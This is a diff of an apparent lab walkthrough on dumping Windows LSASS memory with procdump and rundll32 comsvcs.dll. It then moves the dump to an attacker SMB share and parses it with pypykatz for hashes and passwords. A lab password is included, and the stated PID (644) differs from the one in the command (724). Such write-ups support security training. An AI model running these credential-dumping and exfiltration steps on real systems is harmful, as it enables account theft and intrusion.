@@ -211,10 +211,8 @@ Password: ebz0yxy3txh9BDE*yeh
 <li><code>lsass.exe</code>: The target process.</li>
 <li><code>C:\lsass.dmp</code>: The output file location.</li>
 </ul>
-<pre><code class="language-c"> .\procdump.exe -accepteula -ma lsass.exe C:\lsass.dmp
+<pre><code class="language-powershell"> .\procdump.exe -accepteula -ma lsass.exe C:\lsass.dmp
 </code></pre>
-<p>!image.png</p>
-<p>!image.png</p>
 <h2 id="attacking-lsass-with-native-binaries"><strong>Attacking LSASS with Native Binaries</strong></h2>
 <p>Sometimes, bringing a tool like ProcDump onto a target system is too risky. Instead, attackers use <strong>LOLBins</strong> (Living Off the Land Binaries). These are executables that are already natively installed on Windows.</p>
 <p>One famous method uses <code>rundll32.exe</code> to execute a specific function inside <code>comsvcs.dll</code> (a built-in Windows DLL). This function, <code>MiniDumpW</code>, can dump process memory just like Task Manager.</p>
@@ -222,10 +220,9 @@ Password: ebz0yxy3txh9BDE*yeh
 <p>First, you need the Process ID (PID) of LSASS. You can find this by running <code>tasklist | findstr lsass</code>. Let's say the PID is <strong>644</strong>.</p>
 <p><code>rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 724 C:\lsass2.dmp full</code></p>
 <p><em>Note: This command requires SeDebugPrivilege, which Administrator accounts have by default.</em></p>
-<pre><code class="language-c">tasklist | findstr lsass
+<pre><code class="language-bash">tasklist | findstr lsass
 </code></pre>
-<p>!image.png</p>
-<pre><code class="language-c">rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 724 C:\lsass2.dmp full
+<pre><code class="language-powershell">rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 724 C:\lsass2.dmp full
 </code></pre>
 <h2 id="extracting-secrets-from-lsass-with-pypykatz"><strong>Extracting Secrets from LSASS with pypykatz</strong></h2>
 <p>Now that we have our <code>lsass.dmp</code> file (whether from Task Manager, ProcDump, or rundll32), we need to read it. Memory dumps are completely unreadable to the human eye, so we need a parser.</p>
@@ -244,19 +241,14 @@ Password: ebz0yxy3txh9BDE*yeh
 </ul>
 <p>Once you hit enter, Pypykatz will parse the memory and output the NTLM hashes, cached credentials, and any cleartext passwords it can find!</p>
 <h2 id="transfer-files-via-imapcket-smbserver">Transfer Files via imapcket-smbserver</h2>
-<pre><code class="language-c">sudo impacket-smbserver -smb2support -username 'Administrator' -password 'ebz0yxy3txh9BDE*yeh' share /home/kali/HackSmarter/LSASS
+<pre><code class="language-bash">sudo impacket-smbserver -smb2support -username 'Administrator' -password 'ebz0yxy3txh9BDE*yeh' share /home/kali/HackSmarter/LSASS
 </code></pre>
-<p>!image.png</p>
 <h3>Open up File Explorer and navigate to your IP address and share folder you created</h3>
-<pre><code class="language-c">\\10.200.69.250\share 
+<pre><code class="language-bash">\\10.200.69.250\share 
 </code></pre>
-<p>!image.png</p>
 <p>Once connected you can see connections </p>
-<p>!image.png</p>
 <p>Copy and Paste the lsass.dmp file into our share folder</p>
-<p>!image.png</p>
-<p>!image.png</p>
-<pre><code class="language-c">sudo /root/.local/bin/pypykatz lsa minidump lsass.dmp
+<pre><code class="language-bash">sudo /root/.local/bin/pypykatz lsa minidump lsass.dmp
 
 INFO:pypykatz:Parsing file lsass.dmp
 FILE: ======== lsass.dmp =======
